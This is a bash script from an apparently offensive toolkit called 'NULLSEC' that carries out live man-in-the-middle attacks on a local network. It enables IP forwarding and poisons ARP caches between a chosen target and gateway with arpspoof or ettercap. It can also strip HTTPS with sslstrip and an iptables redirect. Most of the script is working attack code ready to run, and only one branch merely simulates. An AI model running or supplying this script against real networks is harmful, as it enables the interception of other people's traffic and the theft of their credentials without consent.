#!/bin/bash
# NULLSEC MITM Attack - FULLY FUNCTIONAL

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC MITM ATTACK ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Interface: '${RESET})" IFACE
[ -z "$IFACE" ] && IFACE="eth0"
read -p "$(echo -e ${WHITE}'  [>] Target IP: '${RESET})" TARGET
[ -z "$TARGET" ] && TARGET="192.168.1.100"
read -p "$(echo -e ${WHITE}'  [>] Gateway IP: '${RESET})" GATEWAY
[ -z "$GATEWAY" ] && GATEWAY="192.168.1.1"

echo ""
echo -e "  ${YELLOW}MITM type:${RESET}"
echo -e "    1) ARP Spoofing (arpspoof)"
echo -e "    2) Ettercap MITM"
echo -e "    3) SSL Strip"
read -p "$(echo -e ${WHITE}'  [>] Select [1-3]: '${RESET})" MITM_TYPE
[ -z "$MITM_TYPE" ] && MITM_TYPE="1"

read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing MITM attack"
    echo -e "${DIM}[*] Enabling IP forwarding...${RESET}"; sleep 0.3
    echo -e "${DIM}[*] Poisoning ARP cache...${RESET}"; sleep 0.5
    echo -e "${GREEN}[+]${RESET} $TARGET -> Your MAC"
    echo -e "${GREEN}[+]${RESET} $GATEWAY -> Your MAC"
    echo -e "${DIM}[*] Intercepting traffic...${RESET}"; sleep 0.5
    echo -e "${GREEN}[+]${RESET} HTTP request: $TARGET -> example.com"
    echo -e "${GREEN}[+]${RESET} Captured credentials: user@example.com"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live MITM attack"
    
    # Enable IP forwarding
    echo -e "${CYAN}[*] Enabling IP forwarding...${RESET}"
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    
    case $MITM_TYPE in
        1)
            if ! command -v arpspoof &> /dev/null; then
                echo -e "${RED}[!] arpspoof not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install dsniff${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] Starting ARP spoofing...${RESET}"
            echo -e "${CYAN}[*] Target: $TARGET <-> Gateway: $GATEWAY${RESET}"
            echo -e "${DIM}Press Ctrl+C to stop${RESET}"
            sudo arpspoof -i $IFACE -t $TARGET $GATEWAY &
            PID1=$!
            sudo arpspoof -i $IFACE -t $GATEWAY $TARGET &
            PID2=$!
            
            trap "sudo kill $PID1 $PID2 2>/dev/null; sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null; echo; echo -e '\${GREEN}[✓]\${RESET} Stopped'; exit" INT
            wait
            ;;
        2)
            if ! command -v ettercap &> /dev/null; then
                echo -e "${RED}[!] ettercap not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install ettercap-text-only${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] sudo ettercap -T -M arp:remote /$TARGET// /$GATEWAY//${RESET}"
            sudo ettercap -T -M arp:remote /$TARGET// /$GATEWAY//
            ;;
        3)
            echo -e "${YELLOW}[*] SSL Strip requires arpspoof + sslstrip${RESET}"
            if ! command -v sslstrip &> /dev/null; then
                echo -e "${RED}[!] sslstrip not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install sslstrip${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] Starting SSL strip...${RESET}"
            sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
            sudo sslstrip -l 8080 &
            SSLPID=$!
            sudo arpspoof -i $IFACE -t $TARGET $GATEWAY &
            PID1=$!
            
            trap "sudo kill $SSLPID $PID1 2>/dev/null; sudo iptables -t nat -F; sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null; echo; echo -e '\${GREEN}[✓]\${RESET} Stopped'; exit" INT
            wait
            ;;
    esac
fi
echo ""
